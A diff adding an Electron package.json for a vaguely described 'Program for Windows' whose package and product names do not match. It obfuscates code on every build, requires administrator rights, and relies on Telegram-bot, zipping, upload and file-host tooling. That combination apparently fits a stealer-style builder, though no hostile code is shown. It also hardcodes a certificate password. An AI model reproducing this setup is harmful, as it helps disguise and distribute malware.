@@ -1,0 +1,94 @@
+{
+  "name": "sudwalo",
+  "version": "3.1.7",
+  "description": "Program for Windows",
+  "main": "electron/main.js",
+  "author": {
+    "name": "Sudwalo Inc.",
+    "email": "contact@sudwalo.com"
+  },
+  "type": "commonjs",
+  "scripts": {
+    "start": "electron .",
+    "dev": "node index.js",
+    "builder": "node builder-bot.js",
+    "license": "node license-bot.js",
+    "obfuscate": "node build/obfuscator.js",
+    "build": "npm run obfuscate && electron-builder --win portable && node build/sign-exe.js",
+    "build:win": "npm run obfuscate && electron-builder --win portable && node build/sign-exe.js",
+    "build:win:classic": "npm run obfuscate && electron-builder --win --x64",
+    "build:portable": "npm run obfuscate && electron-builder --win portable",
+    "dist": "npm run build:win",
+    "clean": "node build/clean.js",
+    "test:gofile": "node test-gofile.js"
+  },
+  "build": {
+    "appId": "com.oldblturer.app",
+    "productName": "Oldblturer",
+    "copyright": "Copyright © 2026 Sudwalo Inc.",
+    "directories": {
+      "output": "dist",
+      "buildResources": "build/resources"
+    },
+    "asar": true,
+    "asarUnpack": [
+      "**/*.node"
+    ],
+    "files": [
+      {
+        "from": "obfuscated",
+        "to": ".",
+        "filter": [
+          "**/*"
+        ]
+      },
+      "node_modules/**/*",
+      "package.json"
+    ],
+    "win": {
+      "signAndEditExecutable": true,
+      "requestedExecutionLevel": "requireAdministrator",
+      "target": [
+        {
+          "target": "portable",
+          "arch": [
+            "x64"
+          ]
+        }
+      ],
+      "certificateFile": "build/cert.pfx",
+      "certificatePassword": "test123",
+      "timeStampServer": "http://timestamp.digicert.com",
+      "icon": "build/resources/icon.ico",
+      "artifactName": "${productName}-${version}-Portable.${ext}"
+    },
+    "portable": {
+      "requestExecutionLevel": "admin",
+      "artifactName": "${productName}-${version}-Portable.${ext}"
+    },
+    "compression": "maximum"
+  },
+  "keywords": [
+    "utility",
+    "system",
+    "analytics"
+  ],
+  "license": "MIT",
+  "dependencies": {
+    "archiver": "^6.0.1",
+    "axios": "^1.6.0",
+    "dotenv": "^16.3.1",
+    "form-data": "^4.0.0",
+    "js-confuser": "^2.0.1",
+    "node-fetch": "^2.7.0",
+    "node-stream-zip": "^1.15.0",
+    "png-to-ico": "^3.0.1",
+    "sharp": "^0.34.5",
+    "telegraf": "^4.15.0"
+  },
+  "devDependencies": {
+    "electron": "^28.0.0",
+    "electron-builder": "^24.9.1",
+    "javascript-obfuscator": "^4.1.1"
+  }
+}
